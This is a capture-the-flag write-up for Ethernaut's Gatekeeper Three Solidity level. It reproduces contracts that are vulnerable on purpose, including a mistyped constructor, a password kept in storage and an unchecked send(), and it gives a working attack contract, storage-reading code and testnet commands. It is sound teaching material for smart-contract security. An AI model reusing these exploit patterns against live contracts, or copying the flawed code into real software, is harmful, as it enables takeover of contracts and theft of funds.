# Level 28: Gatekeeper Three Challenge

## Challenge Description

Cope with gates and become an entrant.

**Things that might help:**
- Recall return values of low-level functions
- Be attentive with semantic
- Refresh how storage works in Ethereum

## Contract Location

The challenge contract is located at:
```
/contracts/level-28-gatekeeper3/GateKeeper3.sol
```

## Understanding the Challenge

This level involves TWO contracts that work together:

### 1. SimpleTrick

```solidity
contract SimpleTrick {
    GatekeeperThree public target;
    address public trick;
    uint256 private password = block.timestamp;

    constructor(address payable _target) {
        target = GatekeeperThree(_target);
    }

    function checkPassword(uint256 _password) public returns (bool) {
        if (_password == password) {
            return true;
        }
        password = block.timestamp;
        return false;
    }

    function trickInit() public {
        trick = address(this);
    }
}
```

The SimpleTrick contract:
- Stores a password initialized to `block.timestamp` when created
- Even though password is `private`, it can be read from storage!
- Storage slot 2 contains the password

### 2. GatekeeperThree

```solidity
contract GatekeeperThree {
    address public owner;
    address public entrant;
    bool public allowEntrance;

    SimpleTrick public trick;

    function construct0r() public {
        owner = msg.sender;
    }

    modifier gateOne() {
        require(msg.sender == owner);
        require(tx.origin != owner);
        _;
    }

    modifier gateTwo() {
        require(allowEntrance == true);
        _;
    }

    modifier gateThree() {
        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
            _;
        }
    }

    function getAllowance(uint256 _password) public {
        if (trick.checkPassword(_password)) {
            allowEntrance = true;
        }
    }

    function createTrick() public {
        trick = new SimpleTrick(payable(address(this)));
        trick.trickInit();
    }

    function enter() public gateOne gateTwo gateThree {
        entrant = tx.origin;
    }

    receive() external payable {}
}
```

The GatekeeperThree contract has:
- A critical **typo** in the constructor name: `construct0r()` instead of `constructor()`
- Three gates that must be passed to become the entrant

## The Vulnerabilities

### Vulnerability 1: Constructor Typo

**The Bug:**
```solidity
function construct0r() public {  // Note the '0' instead of 'o'
    owner = msg.sender;
}
```

**Why It's Vulnerable:**
- This is NOT a constructor - it's a regular public function!
- In Solidity, constructors must use the `constructor` keyword
- The typo makes it callable by anyone at any time
- There's no access control on this function

**Impact:**
- Anyone can call `construct0r()` and become the owner
- This breaks the entire access control system

### Vulnerability 2: Gate One - Owner Confusion

**The Gate:**
```solidity
modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
}
```

**Requirements:**
1. `msg.sender == owner` - The caller must be the owner
2. `tx.origin != owner` - The transaction origin must NOT be the owner

**Why It's Passable:**
- If owner is a contract (our attack contract), we can:
  - Have the contract call `enter()` (msg.sender = contract = owner) ✓
  - While tx.origin is still the EOA (tx.origin ≠ owner) ✓

**Solution:**
1. Call `construct0r()` from our attack contract to make it the owner
2. Call `enter()` from the attack contract
3. msg.sender will be the contract (owner)
4. tx.origin will be our EOA (not owner)

### Vulnerability 3: Gate Two - Storage Reading

**The Gate:**
```solidity
modifier gateTwo() {
    require(allowEntrance == true);
    _;
}
```

**How to Set allowEntrance:**
```solidity
function getAllowance(uint256 _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
}
```

**The Password:**
```solidity
uint256 private password = block.timestamp;
```

**Why "private" Doesn't Mean Secret:**
- In Solidity, `private` only restricts function access, not storage visibility
- All contract storage is publicly readable on the blockchain
- The password is stored in SimpleTrick at storage slot 2

**Storage Layout of SimpleTrick:**
```
Slot 0: target (address - GatekeeperThree)
Slot 1: trick (address)  
Slot 2: password (uint256) ← This is what we need!
```

**Solution:**
1. Call `createTrick()` to deploy SimpleTrick
2. Read slot 2 from SimpleTrick's storage using `eth_getStorageAt`
3. Call `getAllowance(password)` to set `allowEntrance = true`

### Vulnerability 4: Gate Three - Send Return Value

**The Gate:**
```solidity
modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
        _;
    }
}
```

**Requirements:**
1. Contract balance must be > 0.001 ether
2. `payable(owner).send(0.001 ether)` must return `false`

**Understanding .send():**
```solidity
// send() returns a boolean:
// - true if transfer succeeded
// - false if transfer failed
// - Forwards only 2300 gas (enough for logging, not much else)
```

**Why It Can Fail:**
- If the recipient reverts in their `receive()` or `fallback()` function
- If the recipient runs out of gas
- If the recipient doesn't have a payable function

**Solution:**
1. Send > 0.001 ETH to GatekeeperThree contract
2. Make owner (our attack contract) revert in `receive()` function
3. When `owner.send()` is called, it will revert and return `false`
4. This passes the gate!

## The Complete Attack

### Attack Strategy

```
Step 1: Become Owner
├─ Call construct0r() from attack contract
└─ Now attack contract is the owner

Step 2: Setup SimpleTrick
├─ Call createTrick() to deploy SimpleTrick
└─ SimpleTrick is created with password = block.timestamp

Step 3: Pass Gate Two
├─ Read password from SimpleTrick storage slot 2
│  └─ Use ethers.provider.getStorage(trickAddress, 2)
├─ Call getAllowance(password)
└─ Now allowEntrance = true

Step 4: Fund the Contract
├─ Send > 0.001 ETH to GatekeeperThree
└─ Now contract has sufficient balance

Step 5: Pass All Gates
├─ Call enter() from attack contract
├─ Gate One: ✓ msg.sender (contract) == owner (contract)
├─ Gate One: ✓ tx.origin (EOA) != owner (contract)
├─ Gate Two: ✓ allowEntrance == true
├─ Gate Three: ✓ balance > 0.001 ETH
├─ Gate Three: ✓ owner.send() fails (we revert)
└─ SUCCESS: tx.origin becomes the entrant!
```

### Attack Contract Implementation

```solidity
contract GatekeeperThreeAttack {
    IGatekeeperThree public target;
    bool public shouldRevert = true;
    
    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }
    
    // Step 1: Exploit the typo to become owner
    function becomeOwner() external {
        target.construct0r();
    }
    
    // Step 2: Create SimpleTrick
    function setupTrick() external {
        target.createTrick();
    }
    
    // Step 3: Pass gate two with password (read from storage in script)
    function passGateTwo(uint256 password) external {
        target.getAllowance(password);
    }
    
    // Step 4: Fund the target
    function fundTarget() external payable {
        require(msg.value > 0.001 ether, "Need > 0.001 ether");
        payable(address(target)).transfer(msg.value);
    }
    
    // Step 5: Execute attack
    function attack() external {
        shouldRevert = true;
        target.enter();
    }
    
    // Revert on receive to fail gate three's send()
    receive() external payable {
        if (shouldRevert) {
            revert("Reverting to fail send()");
        }
    }
}
```

## Key Concepts

### 1. Constructor vs Regular Function

**Correct Constructor:**
```solidity
constructor() {
    owner = msg.sender;
}
```

**Common Typos (Pre-0.5.0 Style):**
```solidity
// Before Solidity 0.5.0, constructors used the contract name
function Ethernaut() public {  // Old style
    owner = msg.sender;
}

// Typos were catastrophic:
function Ethenaut() public {   // Typo! Not a constructor!
    owner = msg.sender;
}
```

**The Risk:**
- Before Solidity 0.5.0, typos in constructor names created public functions
- Solidity 0.5.0+ requires the `constructor` keyword to prevent this
- But typos in variable names (like construct0r) still create vulnerabilities

### 2. Private Storage is Not Secret

**The Misconception:**
```solidity
uint256 private password;  // "private" doesn't mean hidden!
```

**The Reality:**
- `private` only affects Solidity function calls
- All storage is publicly readable via RPC calls
- Anyone can read any storage slot

**Reading Storage:**
```javascript
// Using ethers.js
const password = await ethers.provider.getStorage(contractAddress, slotNumber);
```

**Storage Slots:**
```solidity
contract Example {
    uint256 public a;      // Slot 0
    uint256 private b;     // Slot 1 (still readable!)
    address public c;      // Slot 2
}
```

### 3. Low-Level Call Return Values

**send() vs transfer() vs call():**

| Method | Gas | Returns | Reverts on Failure |
|--------|-----|---------|-------------------|
| `.transfer(amount)` | 2300 gas | Nothing | Yes (throws) |
| `.send(amount)` | 2300 gas | bool | No (returns false) |
| `.call{value: amount}("")` | All gas | (bool, bytes) | No (returns false) |

**The Danger of send():**
```solidity
// BAD: Ignores return value
owner.send(amount);

// GOOD: Checks return value
if (!owner.send(amount)) {
    revert("Send failed");
}

// BEST: Use call() for better control
(bool success, ) = owner.call{value: amount}("");
require(success, "Transfer failed");
```

### 4. msg.sender vs tx.origin

**Definitions:**
- `msg.sender`: Immediate caller (can be contract or EOA)
- `tx.origin`: Original EOA that started the transaction chain

**Example:**
```
EOA → Contract A → Contract B
      ↓              ↓
      tx.origin      tx.origin (still EOA)
      msg.sender     msg.sender (Contract A)
```

**Security Implications:**
- Never use `tx.origin` for authentication!
- Attackers can use intermediate contracts to manipulate msg.sender
- Gate One exploits this: owner is contract, tx.origin is EOA

## Step-by-Step Solution

### Step 1: Deploy the Instance Contract

```bash
npx hardhat deploy --tags level-28 --network sepolia
```

This deploys:
- GatekeeperThree contract

### Step 2: Deploy the Attack Contract

```bash
GATEKEEPER_THREE_ADDRESS=0xYourGatekeeperThreeAddress \
  npx hardhat deploy --tags gatekeeper-three-solution --network sepolia
```

Or deploy both together:
```bash
npx hardhat deploy --tags level-28 --network sepolia
```

### Step 3: Execute the Attack

```bash
ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress \
TARGET_ADDRESS=0xGatekeeperThreeAddress \
  npx hardhat run scripts/level-28-gatekeeper-three/attack.ts --network sepolia
```

Expected result: You become the entrant!

## Security Lessons

1. **Always Use Proper Constructor Syntax**:
   - Use the `constructor` keyword (Solidity 0.5.0+)
   - Avoid typos in function names that should be constructors
   - Review constructor logic carefully - it's a common attack vector

2. **Never Trust "private" for Secrets**:
   - All storage is publicly readable
   - Use encryption or off-chain storage for sensitive data
   - Consider commit-reveal schemes for secrets

3. **Always Check Return Values**:
   - `send()` and `call()` return bool - always check it!
   - Don't assume transfers always succeed
   - Use `transfer()` if you want automatic revert on failure

4. **Be Careful with msg.sender vs tx.origin**:
   - Never use `tx.origin` for authentication
   - It's vulnerable to phishing attacks
   - Always use `msg.sender` for access control

5. **Understand Low-Level Calls**:
   - `.send()` forwards 2300 gas - can fail easily
   - `.transfer()` also forwards 2300 gas - throws on failure
   - `.call{value:}()` forwards all gas - most flexible and safe

## Common Pitfalls

1. **Not Noticing the Typo**: Assuming `construct0r()` is actually a constructor
2. **Thinking Private Means Secret**: Trying to hide the password without reading storage
3. **Not Understanding send() Return**: Expecting send() to revert on failure
4. **Wrong Gas Estimation**: Not sending enough ETH or gas for transactions
5. **Receive Function Not Reverting**: Forgetting to make the attack contract revert on receive

## Prevention in Real Contracts

### 1. Proper Constructor

```solidity
// GOOD: Use constructor keyword
constructor() {
    owner = msg.sender;
}

// BAD: Typo creates public function
function construct0r() public {
    owner = msg.sender;
}
```

### 2. Don't Store Secrets in Storage

```solidity
// BAD: Password in storage
uint256 private password;

// GOOD: Use commit-reveal or off-chain verification
bytes32 public passwordHash;

function setPassword(string memory _password) external {
    passwordHash = keccak256(abi.encodePacked(_password));
}

function checkPassword(string memory _password) public view returns (bool) {
    return keccak256(abi.encodePacked(_password)) == passwordHash;
}
```

### 3. Proper Error Handling for Transfers

```solidity
// BAD: Ignores return value
payable(owner).send(amount);

// GOOD: Checks return value
require(payable(owner).send(amount), "Send failed");

// BEST: Use call() with proper error handling
(bool success, ) = payable(owner).call{value: amount}("");
require(success, "Transfer failed");
```

### 4. Proper Access Control

```solidity
// BAD: Uses tx.origin
require(tx.origin == owner);

// GOOD: Uses msg.sender
require(msg.sender == owner);

// BETTER: Use OpenZeppelin's Ownable
import "@openzeppelin/contracts/access/Ownable.sol";
contract MyContract is Ownable {
    function sensitiveFunction() external onlyOwner {
        // ...
    }
}
```

## Advanced Concepts

### Storage Layout

Solidity packs variables into 32-byte slots:

```solidity
contract StorageExample {
    uint256 a;        // Slot 0 (32 bytes)
    uint128 b;        // Slot 1 (16 bytes)
    uint128 c;        // Slot 1 (16 bytes) - packed with b
    address d;        // Slot 2 (20 bytes)
    uint96 e;         // Slot 2 (12 bytes) - packed with d
    string f;         // Slot 3+ (dynamic)
}
```

**Reading Storage:**
```javascript
const slot0 = await ethers.provider.getStorage(contractAddress, 0);
const slot1 = await ethers.provider.getStorage(contractAddress, 1);
```

### Gas Limits in send() and transfer()

Both `send()` and `transfer()` forward exactly 2300 gas:
- Enough for logging events
- Enough for simple storage updates
- NOT enough for complex operations
- NOT enough for calling other contracts

**Example:**
```solidity
// This might fail if recipient does anything complex
payable(recipient).send(amount);  // 2300 gas

// This forwards all available gas
(bool success, ) = payable(recipient).call{value: amount}("");
```

### The 2300 Gas Stipend Issue

The 2300 gas limit is controversial:
- **Pro**: Prevents reentrancy attacks
- **Con**: May not be enough for legitimate operations
- **Con**: Gas costs can change with network upgrades
- **Recommendation**: Use `.call()` with reentrancy guards instead

## References

- [Solidity Constructors](https://docs.soliditylang.org/en/latest/contracts.html#constructors)
- [Storage Layout](https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html)
- [Address.send() Documentation](https://docs.soliditylang.org/en/latest/types.html#members-of-addresses)
- [tx.origin vs msg.sender](https://docs.soliditylang.org/en/latest/security-considerations.html#tx-origin)
- [SWC-115: Authorization through tx.origin](https://swcregistry.io/docs/SWC-115)

## Deployment

Deploy the challenge contract:
```bash
npx hardhat deploy --tags level-28 --network sepolia
```

Deploy the attack contract:
```bash
GATEKEEPER_THREE_ADDRESS=0xAddress \
  npx hardhat deploy --tags gatekeeper-three-solution --network sepolia
```

Execute the attack:
```bash
ATTACK_CONTRACT_ADDRESS=0xAddress \
TARGET_ADDRESS=0xAddress \
  npx hardhat run scripts/level-28-gatekeeper-three/attack.ts --network sepolia
```

## Summary

The GatekeeperThree level teaches us about:
- ✅ Constructor naming vulnerabilities (typos can be critical!)
- ✅ Storage visibility (private ≠ secret)
- ✅ Low-level call return values (always check send() return!)
- ✅ msg.sender vs tx.origin (never use tx.origin for auth)
- ✅ Reverting in receive functions (can be used as a feature)

The key takeaway: **Small mistakes like typos can have huge security implications. Always use proper language features (constructor keyword), check return values, and understand that blockchain storage is always public!**
